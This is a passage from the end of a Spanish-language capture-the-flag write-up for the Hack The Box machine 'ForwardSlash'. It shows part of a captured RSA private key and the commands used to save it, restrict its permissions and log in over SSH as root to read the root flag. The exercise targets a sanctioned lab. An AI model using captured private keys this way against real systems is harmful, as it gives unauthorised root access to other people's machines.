woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi
/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA
1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW
J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr
OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw
ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
-----END RSA PRIVATE KEY-----
```

Copiamos la llave RSA a nuestra máquina y otorgamos al archivo `id_rsa` permisos para que solamente el usuario de nuestra máquina pueda leer y escribir.

```bash
root@kali:/home/kali/Documents/HTB/Machines/ForwardSlash/content# mousepad id_rsa
root@kali:/home/kali/Documents/HTB/Machines/ForwardSlash/content# chmod 600 id_rsa
```

Finalmente, nos conectamos vía SSH con la llave privada y obtenemos la flag del root:

```console
root@kali:/home/kali/Documents/HTB/Machines/ForwardSlash/content# ssh -i id_rsa root@forwardslash.htb
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

Last login: Tue Mar 24 12:11:46 2020 from 10.10.14.3
root@forwardslash:~# pwd
/root
root@forwardslash:~# ls
root.txt
root@forwardslash:~# cat root.txt
901995..........................
```
